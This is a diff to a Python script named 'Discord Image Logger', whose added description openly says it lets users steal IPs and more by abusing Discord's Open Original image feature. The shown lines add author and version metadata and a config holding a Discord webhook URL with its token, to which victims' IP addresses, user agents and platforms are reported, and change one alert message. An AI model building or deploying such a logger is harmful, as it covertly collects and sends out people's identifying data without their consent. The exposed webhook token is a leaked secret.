@@ -5,6 +5,11 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1343977793872203870/vE6QPpJDsIpwD4Myyw-J7mRbSgx3H-OgMpkW4Si2muOmCZc8fXUUo78uJDsh5d6yb2Ch",
@@ -79,7 +84,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"dai figa",
         }
     ],
 }) if config["linkAlerts"] else None 
